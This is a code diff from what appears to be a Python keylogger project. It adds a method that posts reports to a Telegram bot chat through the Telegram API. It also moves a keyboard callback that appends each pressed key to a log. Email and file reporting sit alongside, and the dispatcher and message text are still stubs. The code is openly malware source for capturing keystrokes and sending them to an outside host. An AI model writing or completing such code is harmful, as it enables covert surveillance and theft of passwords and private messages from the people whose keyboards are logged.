@@ -1,8 +1,11 @@
 import keyboard
+import requests
+
 from re import fullmatch
 from contracts import contract, new_contract
 
-from config import SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, EMAIL, EMAIL_PASSWORD
+from config import SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, \
+                   EMAIL, EMAIL_PASSWORD, ADMIN_CHAT_ID
 
 
 @new_contract
@@ -32,16 +35,6 @@ class Keylogger:
         self.report_method = report_method
         self.log = ""
 
-    def callback(self, event):
-        """
-        This method is called when any key is pressed.
-        It tracks the key pressed and writes it to log.
-        """
-        name = event.name
-        if len(name) > 1:
-            pass
-        self.log += name
-
     @contract
     def report_to_email(self, email, password, message):
         """
@@ -56,6 +49,24 @@ class Keylogger:
         :type message: str
         """
 
+    @contract
+    def report_to_telegram(self, bot_token, chat_id):
+        """
+        This method sends reports via telegram bot
+
+        :param bot_token: your bot token (get it in @BotFather)
+        :param chat_id: actually your ID (get it in @username_to_id_bot)
+
+        :type bot_token: str
+        :type chat_id: str
+        """
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        text = ""
+        request = requests.post(url, data={"chat_id": chat_id, "text": text})
+
+        if request.status_code != 200:
+            request.raise_for_status()
+
     def report_to_file(self):
         """
         This method ...
@@ -63,11 +74,15 @@ class Keylogger:
         with open("text.txt", "w") as file:
             print(self.log, file=file)
 
-    def report_to_telegram(self):
+    def callback(self, event):
         """
-        This method ...
+        This method is called when any key is pressed.
+        It tracks the key pressed and writes it to log.
         """
-        pass
+        name = event.name
+        if len(name) > 1:
+            pass
+        self.log += name
 
     def dispatcher(self):
         pass
